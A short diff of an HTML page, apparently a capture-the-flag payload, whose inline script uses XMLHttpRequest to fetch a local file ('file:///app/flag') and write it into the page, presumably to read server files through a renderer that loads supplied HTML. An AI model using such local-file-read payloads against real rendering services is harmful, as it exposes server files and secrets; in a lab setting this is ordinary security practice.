@@ -3,7 +3,7 @@
 
         ver 5
 
- <div id="file" style="color: white"></div>
+ <div id="file">kek</div>
     <script>
         const el = document.getElementById('file');
         function reqListener () {
@@ -12,7 +12,7 @@
 
         var oReq = new XMLHttpRequest();
         oReq.addEventListener("load", reqListener);
-        oReq.open("GET", "file://./flag");
+        oReq.open("GET", "file:///app/flag");
         oReq.send();
     </script>        
     </body>
